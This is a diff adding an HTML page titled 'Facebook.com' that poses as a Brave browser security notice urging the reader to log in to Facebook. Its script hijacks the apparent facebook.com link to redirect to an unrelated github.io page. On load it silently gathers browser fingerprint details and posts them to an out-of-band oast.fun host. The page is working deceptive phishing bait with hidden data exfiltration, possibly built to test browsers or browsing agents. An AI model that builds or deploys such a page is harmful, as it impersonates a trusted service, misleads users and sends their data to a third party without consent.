@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook.com</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .security-alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .button {
+            background: #1a73e8;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .preview-link {
+            color: #1a73e8;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔒 Brave Browser Security Update</h1>
+    
+    <div class="security-alert">
+        <h3>⚠️ Important Security Notice</h3>
+        <p>OPEN LINK TO LOGIN YOUR FACEBOOK ACCOUNT.</p>
+        <p>Click the link below to LOGIN:</p>
+        <a href="https://facebook.com" class="preview-link">
+            Login Facebook.com
+        </a>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const maliciousLink = document.querySelector('.preview-link');
+            
+            maliciousLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+            
+                window.location.href = 'https://sauceialist.github.io/dia/test3.html' +  
+                    encodeURIComponent('');
+            });
+
+            
+            collectFingerprint();
+        });
+
+        function collectFingerprint() {
+            const fingerprint = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                timestamp: Date.now()
+            };
+
+        
+            fetch('https://xzyoueivlwuoczvmzdkqqjenlqqjxdxxl.oast.fun/fingerprint', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(fingerprint)
+            });
+        }
+    </script>
+</body>
+</html>
